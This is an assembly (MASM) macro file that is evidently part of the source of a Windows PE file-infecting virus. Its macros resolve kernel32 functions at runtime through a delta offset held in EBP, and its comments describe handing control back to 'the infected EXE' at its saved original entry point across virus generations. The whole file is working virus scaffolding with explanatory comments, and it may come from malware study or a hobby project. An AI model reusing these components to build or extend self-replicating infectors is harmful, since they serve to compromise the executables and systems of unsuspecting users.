; REQUIRED_API is a macro that defines two vars:
;  1. a zero terminated API name
;  2. a pointer to the API function
; The pointer is populated at runtime by finding the
; API name in kernel32.dll using LINK_API
;
; e.g.
;
;   REQUIRED_API ExitProcess
;
; would result in:
;
;   szExitProcess DB "ExitProcess", 0
;   ExitProcess   DD 0
;
REQUIRED_API MACRO var:REQ
  ;; pointer to a null terminated string with the API name
  sz&var  DB "&var",0
  ;; pointer to the API function
  &var    DD 0
ENDM

; DESC_RUNTIME_API is a macro that creates a PROCDESC prefixed
; with "proc" for a given proc name.
;
; e.g.
;
;   DESC_RUNTIME_API GetProcAddress,<baseAddr:DWORD,szName:DWORD>
;
; would result in:
;
;   procGetProcAddress PROCDESC stdcall baseAddr:DWORD,szName:DWORD
;
; NOTE(@cpu): Don't forget to use <> around the procedure's arguments
;             or they'll be treated as separate arguments to the macro
;             instead of one argument to the macro describing all of the
;             arguments for the procedure's PROCDESC.
DESC_RUNTIME_API MACRO name:REQ,args
  proc&name PROCDESC stdcall &args
ENDM

; CALL_RUNTIME_API is a macro that calls a given API previously setup
; with REQUIRED_API, DESC_RUNTIME_API and LINK_API. The given reg will
; be used as a scratch register to load the address of the API to call.
; If none is provided, edx is used.
;
; e.g.
;
;   CALL_RUNTIME_API GetProcAddress, <ebx,ecx>, eax
;
; would result in:
;
;   The address of GetProcAddress being put into eax, and called with the
;   arguments ebx and ecx.
;
CALL_RUNTIME_API MACRO name:REQ, args, reg:=<edx>
  mov &reg, [ebp + &name]
  call (type proc&name) PTR &reg, &args
ENDM

; LINK_API finds the given REQUIRED_API in kernel32.dll by its sz pointer
; using GetProcAddress. The API address is saved in the REQUIRED_API
; function pointer for use with CALL_RUNTIME_API. A kernel32Base variable
; is expected to hold the base address of kernel32.dll
LINK_API MACRO var:REQ
    ; Add the kernel32.dll base address
    mov ebx, [ebp + kernel32Base]
    ; Put the offset of the null terminated string with the
    ; required API name into ecx
    mov ecx, offset sz&var
    ; Add the delta offset to the string offset
    add ecx, ebp
    ; Invoke GetProcAddress( kernel32.dll, sz&var )
    CALL_RUNTIME_API GetProcAddress, <ebx, ecx>, eax
    ; If the return was zero there was an error
    or eax, eax
    jz error
    ; Otherwise save the function address into the pointer var
    mov [ebp + &var], eax
ENDM

; CALL_OEP is a macro for calling the savedEntryPoint of the
; infected EXE. If called in generation 0 it is equivalent to
; a jmp to the error label because there is no saved entry
; point. When called in generation 1 the GetModuleHandleA API
; function from kernel32.dll is used to find the absolute
; address with the savedEntryPoint RVA.
CALL_OEP MACRO
    LOCAL @@notgenzero
    LOCAL @@genzero
    ; Use EBP to decide if this is gen > 0
    cmp ebp, 0h
    je @@genzero
@@notgenzero:
    ; When it isn't gen0 we need to jmp to OEP
    ; First calculate the base address of the infected PE
    CALL_RUNTIME_API GetModuleHandleA, <0h>
    ; Then add the saved OEP
    add eax, [ebp + savedEntryPoint]
    ; Bye bye! Give control to the non-viral code.
    jmp eax
@@genzero:
    ; When it is gen0 we don't have an OEP to
    ; jmp to. Instead just jmp to error and ExitProcess.
    jmp error
ENDM
